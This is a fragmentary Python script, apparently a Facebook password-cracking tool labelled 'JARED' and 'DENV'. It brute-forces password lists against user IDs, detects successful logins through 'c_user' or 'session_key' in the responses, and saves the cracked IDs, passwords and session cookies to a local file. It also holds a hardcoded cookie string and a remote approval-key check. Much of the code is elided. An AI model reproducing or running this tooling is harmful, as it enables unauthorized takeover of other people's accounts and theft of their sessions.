...
def mumit2(uid,pwx,tl):
    ...
    # 'cookie': 'datr=xyJoZU720JGwN1U4HplWVsDD; sb=xyJoZdheyerFzG_j9PJUFHj1; m_pixel_ratio=1.6011383533477783; wd=450x859; fr=0uxobM8gxr4E0gYXD..BlaCLH.03.AAA.0.0.BlaCLi.AWWDUokDz5A',
    'dpr': '2',
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write('\r\r\033[1;37m [JARED-V1-RNDM] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def api(ids,names,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [JARED-API-FILE] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				...
				print('\r\r\033[1;32m [DENV-OK] '+str(ids)+' | '+pas+'\033[1;97m')
				open('/sdcard/-OK.txt','a').write(str(ids)+'|'+pas+'|'+coki+'\n')
				oks.append(str(uid))
				break
			elif 'www.facebook.com' in po['error']['message']:
				#print('\r\r\x1b[1;33m [DENV-LOGE] '+str(ids)+' | '+pas+'\033[1;97m')
...
def sub():
  ...
  clear()
  print(logo)
  r1=str(urlopen("https://github.com/denvwu/denvwu/blob/main/approval.txt").read())
  if key1 in r1:
    os.system('clear')
    menu()
  else:
